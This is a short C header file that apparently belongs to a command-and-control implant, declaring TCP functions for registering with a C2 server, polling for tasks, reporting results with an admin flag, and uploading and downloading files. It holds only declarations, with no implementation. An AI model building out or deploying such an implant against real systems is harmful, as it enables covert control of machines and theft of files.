#pragma once
#include "transport.h"

// Register with C2 via TCP. Returns 1 on success.
int  transport_tcp_register(void);

// Poll for tasks via TCP. Returns heap-allocated array; *count set to number.
AgentTask* transport_tcp_beacon(int *count);

// Send result via TCP.
void transport_tcp_send_result(long long task_id, const char *output,
                               const char *error, int is_admin);

// Upload a file to the C2 server over the persistent TCP connection.
void transport_tcp_upload_file(long long task_id, const char *filename,
                               const uint8_t *data, size_t data_len);

// Download a file from the C2 server over the persistent TCP connection.
// Returns heap-allocated plaintext (caller must free) or NULL on failure.
uint8_t* transport_tcp_download_file(const char *filename, size_t *out_len);
